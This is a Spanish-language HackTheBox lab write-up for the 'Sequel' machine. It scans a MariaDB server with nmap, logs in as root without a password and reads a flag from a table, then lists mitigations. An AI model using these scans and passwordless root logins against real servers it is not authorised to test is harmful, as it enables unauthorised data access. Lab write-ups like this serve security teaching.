---
layout: post
title: HTB — Sequel
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: MySQL expuesto sin autenticación
tags:
  - MySQL
  - Linux
---

## Introducción

Sequel presenta el mismo patrón que Mongod pero con **MySQL** — la base de datos relacional más usada en el mundo. Un servidor MySQL expuesto a la red con el usuario `root` sin contraseña es un error crítico que aparece con frecuencia en servidores mal configurados o entornos de desarrollo que nunca se endurecieron antes de pasar a producción.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT     STATE SERVICE
3306/tcp open  mysql
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p3306 10.129.x.x -oN target
# -sC       Ejecuta scripts de detección por defecto (NSE)
# -sV       Detecta versión del servicio
# -p3306    Escanea solo el puerto 3306
# -oN       Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.5-10.3.27-MariaDB
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB
|_  Auth Plugin Name: mysql_native_password
```

Puerto 3306 — MySQL/MariaDB expuesto directamente a la red.

---

## Explotación

Intento conectarme con el usuario `root` sin contraseña:

```bash
mysql -h 10.129.x.x -u root -p
# -h    Host del servidor MySQL
# -u    Usuario
# -p    Solicita contraseña (presionar Enter sin escribir nada)
```

```
Welcome to the MariaDB monitor.
MySQL [(none)]>
```

Acceso concedido sin contraseña.

---

## Enumeración de la base de datos

```sql
-- Listar todas las bases de datos
SHOW databases;
```

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

La base de datos `htb` es la candidata. Me muevo a ella:

```sql
-- Seleccionar la base de datos
USE htb;

-- Listar tablas
SHOW tables;
```

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Reviso la tabla `config`:

```sql
SELECT * FROM config;
```

```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+----+-----------------------+----------------------------------+
```

---

## ¿Qué aprendemos de esto?

**MySQL expuesto a internet sin contraseña es una catástrofe.** El puerto 3306 nunca debería ser accesible desde fuera de la red interna. Las bases de datos deben estar detrás de un firewall, accesibles solo desde los servidores de aplicación que las necesitan.

**`root` sin contraseña es el peor escenario posible.** Acceso total a todas las bases de datos, capacidad de leer, modificar o eliminar cualquier dato, y en algunas configuraciones incluso ejecutar comandos del sistema con `INTO OUTFILE` o UDFs.

**Los entornos de desarrollo son un riesgo si llegan a producción.** MySQL en desarrollo frecuentemente corre sin contraseña por comodidad. El problema es cuando ese servidor pasa a producción sin endurecer la configuración.

---

## Comandos básicos de MySQL para CTF

```sql
SHOW databases;              -- listar bases de datos
USE <nombre>;                -- seleccionar base de datos
SHOW tables;                 -- listar tablas
SELECT * FROM <tabla>;       -- ver todo el contenido de una tabla
DESCRIBE <tabla>;            -- ver estructura de una tabla
SELECT * FROM <tabla> WHERE <campo>='<valor>';  -- filtrar resultados
```

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 3306/tcp (MySQL/MariaDB) |
| Vulnerabilidad | MySQL sin autenticación accesible desde red |
| Acceso obtenido | Root en MySQL, lectura completa de todas las bases de datos |
| Herramientas | `nmap`, `mysql` |
| Mitigación | Requerir contraseña para root, restringir acceso por IP, nunca exponer MySQL a internet, usar firewall |
